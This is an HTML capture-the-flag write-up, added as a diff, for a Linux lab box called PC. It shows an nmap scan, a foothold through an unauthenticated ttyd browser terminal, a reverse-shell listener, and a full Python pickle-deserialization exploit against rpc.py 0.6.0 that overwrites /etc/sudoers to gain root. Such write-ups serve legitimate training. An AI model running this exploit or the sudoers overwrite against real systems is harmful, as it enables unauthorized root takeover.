@@ -1,0 +1,110 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>PC &middot; Writeups</title>
+<link rel="stylesheet" href="style.css">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/atom-one-dark.min.css">
+</head>
+<body>
+<header class="topbar">
+  <a class="home" href="./index.html">&larr; all writeups</a>
+  <span class="brand">SAMSON &middot; CTF</span>
+</header>
+<main class="article">
+  <div class="boxhead">
+    <div class="bh-left">
+      <span class="badge pg">PG</span>
+      <span class="badge os">Linux</span>
+      <span class="badge deep">in-depth</span>
+    </div>
+    <h1>PC</h1>
+    <div class="meta">Target: <code>192.168.45.244</code></div>
+    <div class="tags"><span class="tag">Linux</span><span class="tag">ttyd</span><span class="tag">WebTerminal</span><span class="tag">rpc</span><span class="tag">PickleDeserialization</span><span class="tag">RCE</span><span class="tag">SudoersOverwrite</span></div>
+  </div>
+  <div class="layout">
+    <nav class="toc"><a class="lvl2" href="#overview">Overview</a><a class="lvl2" href="#recon">Recon</a><a class="lvl3" href="#port-scan">Port Scan</a><a class="lvl2" href="#foothold">Foothold</a><a class="lvl3" href="#shell-via-ttyd-web-console">Shell via ttyd Web Console</a><a class="lvl2" href="#privilege-escalation">Privilege Escalation</a><a class="lvl3" href="#rpc-py-pickle-deserialization-rce">rpc.py Pickle Deserialization RCE</a><a class="lvl2" href="#root">Root</a><a class="lvl2" href="#takeaways">Takeaways</a></nav>
+    <article class="body"><h2 id="overview">Overview</h2>
+<p>PC is a Linux box where the entire attack surface is a browser-based terminal exposed on port 8000 via <code>ttyd</code>. That terminal runs as a low-privilege user, but a locally-bound Python RPC service (<code>rpc.py</code>) accepts pickle-deserialized data, a class of vulnerability that gives arbitrary code execution. Exploiting it rewrites <code>/etc/sudoers</code> and grants unrestricted root access in one step.</p>
+<h2 id="recon">Recon</h2>
+<h3 id="port-scan">Port Scan</h3>
+<pre><code class="language-sh">PORT     STATE SERVICE  VERSION
+22/tcp   open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.9
+8000/tcp open  http-alt ttyd/1.7.3-a2312cb (libwebsockets/3.2.0)
+|_http-title: ttyd - Terminal
+</code></pre>
+<blockquote>
+<p><strong>What ttyd is:</strong> <code>ttyd</code> is a tool that wraps a shell, or any process, in a WebSocket-backed terminal accessible from a browser. Port 8000 here literally hands you a running shell session in the browser, no authentication. The catch is it runs as an unprivileged user.</p>
+</blockquote>
+<h2 id="foothold">Foothold</h2>
+<h3 id="shell-via-ttyd-web-console">Shell via ttyd Web Console</h3>
+<p>Port 8000 presents a fully interactive browser terminal. The installed <code>nc</code> lacks the <code>-e</code> flag, so a standard one-liner reverse shell won't work directly. Instead, a static <code>nc</code> binary was transferred from Kali and used to catch a shell over port 443:</p>
+<pre><code class="language-sh">rlwrap nc -lvnp 443
+connect to [192.168.45.244] from (UNKNOWN) [192.168.183.210] 42652
+whoami
+user
+</code></pre>
+<p>TTY upgrade:</p>
+<pre><code class="language-python">python3 -c 'import pty; pty.spawn(&quot;/bin/bash&quot;)'
+</code></pre>
+<h2 id="privilege-escalation">Privilege Escalation</h2>
+<h3 id="rpc-py-pickle-deserialization-rce">rpc.py Pickle Deserialization RCE</h3>
+<p>LinPEAS finds a Python RPC service:</p>
+<pre><code>/opt/rpc.py
+</code></pre>
+<p>It is bound to <code>127.0.0.1:65432</code> internally. The version is <code>rpc.py 0.6.0</code>, which has a public exploit on ExploitDB:</p>
+<p><strong>rpc.py 0.6.0 - Remote Code Execution (RCE)</strong>
+https://www.exploit-db.com/exploits/50983</p>
+<blockquote>
+<p><strong>Why pickle deserialization is so dangerous:</strong> Python's <code>pickle</code> module serializes arbitrary objects, and deserializing a payload executes whatever the object's <code>__reduce__</code> method returns. If a server accepts pickle-serialized HTTP bodies without validating them, any client can send an object that runs <code>os.system("...")</code> on the server side. There is no safe way to deserialize untrusted pickle data.</p>
+</blockquote>
+<p>The exploit code was adjusted to work with Python 3. The payload overwrites <code>/etc/sudoers</code> to grant the <code>user</code> account unrestricted root access:</p>
+<pre><code class="language-python">import requests
+import pickle
+
+HOST = &quot;127.0.0.1:65432&quot;
+URL = f&quot;http://{HOST}/sayhi&quot;
+HEADERS = {&quot;serializer&quot;: &quot;pickle&quot;}
+
+def generate_payload(cmd):
+    class PickleRce(object):
+        def __reduce__(self):
+            import os
+            return os.system, (cmd,)
+    return pickle.dumps(PickleRce())
+
+def exec_command(cmd):
+    payload = generate_payload(cmd)
+    requests.post(url=URL, data=payload, headers=HEADERS)
+
+def main():
+    exec_command('echo &quot;user ALL=(root) NOPASSWD: ALL&quot; &gt; /etc/sudoers')
+
+if __name__ == &quot;__main__&quot;:
+    main()
+</code></pre>
+<p>Running it from the target (since the service is localhost-only):</p>
+<pre><code class="language-sh">user@pc:/tmp$ python3 test.py
+b'\x80\x04\x95N\x00\x00\x00...'
+</code></pre>
+<h2 id="root">Root</h2>
+<pre><code class="language-sh">user@pc:/tmp$ sudo /bin/bash
+root@pc:/tmp# whoami
+root
+</code></pre>
+<pre><code class="language-sh">root@pc:~# cat proof.txt
+‹redacted›
+</code></pre>
+<h2 id="takeaways">Takeaways</h2>
+<ul>
+<li><strong>Unauthenticated ttyd is a shell.</strong> No exploit needed, the foothold was browsing to port 8000 and running commands in a browser tab.</li>
+<li><strong>Localhost services are still in scope.</strong> Once inside as any user, locally-bound services become reachable. Always check what's listening internally with <code>ss -tlnp</code> or what LinPEAS surfaces.</li>
+<li><strong>Pickle deserialization = RCE, always.</strong> Any service that deserializes pickle data from user-controlled input can be turned into arbitrary code execution with a 5-line Python payload. The <code>serializer: pickle</code> header in this service was the only signal needed.</li>
+</ul></article>
+  </div>
+</main>
+<footer class="foot">Samson Laird &middot; retired-machine writeups &middot; secrets redacted</footer>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
+<script>hljs.highlightAll();</script>
+</body>
+</html>
